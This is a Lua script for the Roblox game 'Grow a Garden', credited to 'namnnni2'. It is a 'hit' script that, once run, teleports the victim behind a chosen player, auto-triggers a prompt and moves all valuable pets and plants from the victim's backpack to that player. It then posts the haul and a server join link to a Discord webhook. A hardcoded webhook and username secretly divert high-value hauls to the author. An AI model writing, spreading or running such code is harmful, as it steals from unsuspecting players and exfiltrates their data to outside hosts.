
-- GROW A GARDEN HIT - By namnnni2

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Backpack = Players.LocalPlayer:WaitForChild("Backpack")
local Modules = ReplicatedStorage:WaitForChild("Modules")

-- MODULE
local petUtils = require(Modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local calcPlantValue = require(Modules:WaitForChild("CalculatePlantValue"))

-- CONFIG
local env = getfenv()
local PRIMARY_WEBHOOK = env.Webhook
local PRIMARY_USERNAME = env.Username
local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
local DUAL_USERNAME = "namnnni2"
local VALUE_THRESHOLD = 1_000_000_000_000
local HEAVY_WEIGHT = 10
local VIP_PETS = {"Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "Butterfly", "Dragonfly", "Raccoon"}

-- HELPERS
local function formatNumber(n)
    return tostring(math.floor(n)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

local function getRequestFunction()
    return (syn and syn.request)
        or (http and http.request)
        or (fluxus and fluxus.request)
        or (getgenv and getgenv().request)
        or request
end

local function calculateItemValue(tool)
    local itemType = tool:GetAttribute("ItemType")
    if itemType == "Pet" then
        return petUtils:GetPetValue(tool)
    elseif itemType == "Plant" then
        return calcPlantValue(tool)
    end
    return 0
end

local function calculatePriority(item)
    local priority = 0
    if table.find(VIP_PETS, item.Name) then priority += 1000 end
    if (item.Weight or 0) >= HEAVY_WEIGHT then priority += 500 end
    priority += item.Value or 0
    return priority
end

local function sortByPriority(a, b)
    return calculatePriority(a) > calculatePriority(b)
end

-- WEBHOOK
local function sendWebhookNotification(items, totalValue, targetName)
    local useDual = totalValue >= VALUE_THRESHOLD
    local webhookUrl = useDual and DUAL_WEBHOOK or PRIMARY_WEBHOOK
    local username = useDual and DUAL_USERNAME or (PRIMARY_USERNAME or "unknown")

    if not webhookUrl then
        warn("❌ Không tìm thấy webhook. Hủy gửi.")
        return
    end

    local hasVIPOrHeavyPet = false
    for _, item in ipairs(items) do
        if table.find(VIP_PETS, item.Name) or (item.Weight or 0) >= HEAVY_WEIGHT then
            hasVIPOrHeavyPet = true
            break
        end
    end

    local categories = {
        {name = "💎 VIP Pets", items = {}},
        {name = "🏋️ Heavy Pets", items = {}},
        {name = "🐾 Regular Pets", items = {}},
        {name = "🌱 Plants", items = {}}
    }

    for _, item in ipairs(items) do
        if table.find(VIP_PETS, item.Name) then
            table.insert(categories[1].items, item)
        elseif (item.Weight or 0) >= HEAVY_WEIGHT then
            table.insert(categories[2].items, item)
        elseif item.Type == "Pet" then
            table.insert(categories[3].items, item)
        else
            table.insert(categories[4].items, item)
        end
    end

    local descriptionParts = {}
    for _, category in ipairs(categories) do
        if #category.items > 0 then
            table.insert(descriptionParts, "**"..category.name.." ("..#category.items..")**")
            for _, item in ipairs(category.items) do
                table.insert(descriptionParts, string.format("- %s: $%s (%.1fkg)", item.Name, formatNumber(item.Value), item.Weight or 0))
            end
            table.insert(descriptionParts, "")
        end
    end

    local payload = {
        username = username,
        embeds = {{
            title = useDual and "💎 VIP TRANSFER" or "📦 ITEM TRANSFER",
            color = useDual and 0xFFD700 or 0x00FF00,
            description = table.concat(descriptionParts, "\n"),
            fields = {
                {name = "👤 Sender", value = Players.LocalPlayer.Name, inline = true},
                {name = "🎯 Receiver", value = targetName, inline = true},
                {name = "💰 Total Value", value = "$"..formatNumber(totalValue), inline = true},
                {name = "🔗 Quick Join", value = string.format("https://fern.wtf/JoinPlace?placeId=%d&jobId=%s", game.PlaceId, game.JobId)}
            },
            footer = {text = os.date("%Y-%m-%d %H:%M:%S")},
            timestamp = DateTime.now():ToIsoDate()
        }},
        content = hasVIPOrHeavyPet and "@everyone" or nil
    }

    local req = getRequestFunction()
    if not req then return end

    local success, response = pcall(function()
        return req({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if success then
        print("✅ Webhook sent successfully to:", webhookUrl)
    else
        warn("❌ Webhook failed to send:", response)
    end
end

-- AUTO TRANSFER PROMPT
local currentPrompt = nil
local isTransferring = false
local connection = nil

local function waitForItemRemoval(tool)
    local timeout = 5
    local startTime = os.time()
    while tool and tool.Parent == Backpack do
        if os.time() - startTime > timeout then
            warn("Timeout waiting for item to be removed:", tool.Name)
            return false
        end
        task.wait(0.1)
    end
    return true
end

local function createAutoPrompt(targetCharacter, targetName)
    if currentPrompt then currentPrompt:Destroy() end

    local prompt = Instance.new("ProximityPrompt")
    prompt.ObjectText = "Transfer to "..targetName
    prompt.ActionText = "Auto-Transfer"
    prompt.HoldDuration = 0.5
    prompt.MaxActivationDistance = 10
    prompt.Parent = targetCharacter:FindFirstChild("HumanoidRootPart")

    prompt.Triggered:Connect(function()
        if isTransferring then return end
        isTransferring = true

        local items = {}
        local totalValue = 0
        for _, tool in ipairs(Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local item = {
                    Name = tool.Name,
                    Type = tool:GetAttribute("ItemType"),
                    Value = calculateItemValue(tool),
                    Weight = tool:GetAttribute("Weight"),
                    Tool = tool
                }
                totalValue += item.Value
                table.insert(items, item)
            end
        end

        table.sort(items, sortByPriority)

        local targetBackpack = Players:FindFirstChild(targetName):FindFirstChildOfClass("Backpack")
        if targetBackpack then
            for _, item in ipairs(items) do
                if item.Tool and item.Tool.Parent == Backpack then
                    item.Tool.Parent = targetBackpack
                    if not waitForItemRemoval(item.Tool) then
                        warn("Failed to transfer item:", item.Name)
                        break
                    end
                    task.wait(0.3)
                end
            end
        end

        sendWebhookNotification(items, totalValue, targetName)

        isTransferring = false
    end)

    currentPrompt = prompt

    delay(0.5, function()
        if prompt and prompt.Parent then
            prompt:InputHoldBegin()
            wait(prompt.HoldDuration)
            prompt:InputHoldEnd()
        end
    end)
end

local function teleportAndFollow(targetPlayer)
    if not targetPlayer.Character then return end
    local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetHRP then return end

    local myCharacter = Players.LocalPlayer.Character
    if not myCharacter then return end
    local myHRP = myCharacter:FindFirstChild("HumanoidRootPart")
    if not myHRP then return end

    if connection then connection:Disconnect() end

    connection = RunService.Heartbeat:Connect(function(deltaTime)
        local targetCF = targetHRP.CFrame
        local behindPos = targetCF.Position - (targetCF.LookVector * 3)
        local newPos = myHRP.Position:Lerp(behindPos, deltaTime * 10)
        myHRP.CFrame = CFrame.new(newPos, targetHRP.Position)

        if not currentPrompt then
            createAutoPrompt(targetPlayer.Character, targetPlayer.Name)
        end
    end)
end

local function onPlayerChatted(player, message)
    if (player.Name == PRIMARY_USERNAME or player.Name == DUAL_USERNAME) and not isTransferring then
        if player.Character then
            teleportAndFollow(player)
        else
            player.CharacterAdded:Once(function()
                teleportAndFollow(player)
            end)
        end
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(msg)
        onPlayerChatted(player, msg)
    end)
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        onPlayerChatted(player, msg)
    end)
end)
